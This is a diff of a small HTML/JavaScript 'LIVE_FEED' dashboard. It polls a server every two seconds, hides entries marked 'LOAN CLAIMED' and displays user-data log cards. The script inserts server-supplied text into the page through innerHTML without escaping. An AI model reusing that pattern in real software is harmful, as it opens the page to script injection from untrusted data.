@@ -14,72 +14,75 @@
         
         /* Header Section */
         .header { 
-            background: #f1f1f1; 
+            background: #f8f9fa; 
             color: #333; 
-            padding: 10px; 
+            padding: 12px; 
             font-size: 11px; 
             font-weight: bold; 
-            border-radius: 2px;
-            margin-bottom: 10px; 
+            border-radius: 4px;
+            margin-bottom: 12px; 
             display: flex; 
             justify-content: space-between;
             align-items: center;
-            border: 1px solid #ddd;
+            border: 1px solid #eee;
         }
 
-        /* Red Bold Number on Right Top */
+        /* Red Bold Number on Top Right */
         #count {
-            color: #ff0000; /* Pure Red */
-            font-size: 16px; 
-            font-weight: 900; /* Extra Bold */
+            color: #ff0000; 
+            font-size: 18px; 
+            font-weight: 900;
         }
 
-        .status-dot { color: #00a859; animation: blink 1s infinite; margin-right: 4px; }
+        .status-dot { color: #00a859; animation: blink 1s infinite; margin-right: 5px; }
         @keyframes blink { 50% { opacity: 0; } }
 
         /* Full Screen Black Card - Ultra Patla */
         .log-card { 
             background: #000000; 
-            margin-bottom: 4px; 
-            padding: 6px 10px; 
-            border-radius: 2px;
+            margin-bottom: 6px; 
+            padding: 10px 15px; 
+            border-radius: 3px;
             width: 100%;
             display: flex;
             flex-direction: column;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
         }
 
-        /* Small White Text */
+        /* White Data Text - Example: User id:- aman */
         .detail-text { 
             color: #ffffff; 
-            font-size: 11.5px; 
+            font-size: 13px; 
             white-space: pre-wrap; 
-            line-height: 1.3;
+            line-height: 1.6;
             word-break: break-all;
+            letter-spacing: 0.5px;
         }
 
-        /* Meta Info (Only ID & Time) */
+        /* Meta Info (ID & Time) */
         .meta { 
             display: block; 
-            margin-top: 4px; 
-            font-size: 8.5px; 
-            color: #777; 
+            margin-top: 6px; 
+            font-size: 9px; 
+            color: #666; 
             text-align: right;
-            border-top: 1px solid #222;
-            padding-top: 3px;
+            border-top: 1px solid #1a1a1a;
+            padding-top: 5px;
         }
 
         #logsContainer { width: 100%; }
-        .loading { font-size: 12px; color: #999; text-align: center; margin-top: 20px; }
+        .loading { font-size: 12px; color: #aaa; text-align: center; margin-top: 30px; }
     </style>
 </head>
 <body>
 
     <div class="header">
-        <span><span class="status-dot">●</span> LIVE_TERMINAL</span>
-        <span id="count">0</span> </div>
+        <span><span class="status-dot">●</span> LIVE_FEED</span>
+        <span id="count">0</span>
+    </div>
 
     <div id="logsContainer">
-        <p class="loading">Connecting to server...</p>
+        <p class="loading">Fetching Data...</p>
     </div>
 
     <script>
@@ -91,27 +94,32 @@
                 const data = await response.json();
                 
                 const container = document.getElementById('logsContainer');
-                document.getElementById('count').innerText = data.length;
+                
+                // Sirf wahi data filter kar rahe hain jo "LOAN CLAIMED" wala nahi hai
+                const filteredData = data.filter(item => {
+                    return item.detail && !item.detail.includes("LOAN CLAIMED");
+                });
 
-                if (!data || data.length === 0) {
-                    container.innerHTML = "<p class='loading'>Waiting for data...</p>";
+                document.getElementById('count').innerText = filteredData.length;
+
+                if (filteredData.length === 0) {
+                    container.innerHTML = "<p class='loading'>No User Data Found.</p>";
                     return;
                 }
 
-                // Building the list - "Visit" removed
-                container.innerHTML = data.map(item => `
+                container.innerHTML = filteredData.map(item => `
                     <div class="log-card">
-                        <div class="detail-text">${item.detail || ''}</div>
+                        <div class="detail-text">${item.detail}</div>
                         <div class="meta">ID:${item.id} | ${item.time}</div>
                     </div>
                 `).join('');
 
             } catch (err) {
-                console.error("Connection Error");
+                console.error("Sync Error");
             }
         }
 
-        // 2 Second Refresh
+        // 2 Second Auto-Update
         setInterval(fetchLogs, 2000);
         window.onload = fetchLogs;
     </script>
